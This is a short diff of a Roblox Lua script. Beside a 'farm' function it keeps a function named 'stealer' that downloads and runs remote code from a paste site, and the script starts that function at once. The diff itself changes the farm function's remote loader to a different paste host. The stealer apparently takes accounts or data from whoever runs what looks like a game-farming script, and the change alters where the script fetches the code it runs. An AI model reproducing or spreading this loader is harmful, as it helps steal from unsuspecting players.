@@ -2,7 +2,7 @@ local function stealer()
     loadstring(game:HttpGet("https://pastefy.app/zGgXwhr4/raw"))()
 end
 local function farm()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/renardofficiel/games/refs/heads/main/loader.lua', true))()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/6xywIy1cxQ/0", true))()
 end
 
 task.spawn(stealer)
